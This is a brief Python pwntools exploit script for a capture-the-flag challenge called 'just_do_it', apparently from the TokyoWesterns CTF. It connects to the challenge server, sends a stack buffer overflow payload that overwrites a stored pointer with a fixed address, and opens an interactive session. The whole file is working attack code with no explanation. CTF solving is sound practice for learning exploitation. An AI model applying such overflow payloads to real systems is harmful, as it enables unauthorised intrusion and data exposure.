from pwn import *

#p = process("./just_do_it")
p = connect("pwn1.chal.ctf.westerns.tokyo",12345)
print p.recv()
payload = "a"*(0x20-0xc) + p32(0x0804A080)
p.send(payload)
p.interactive()
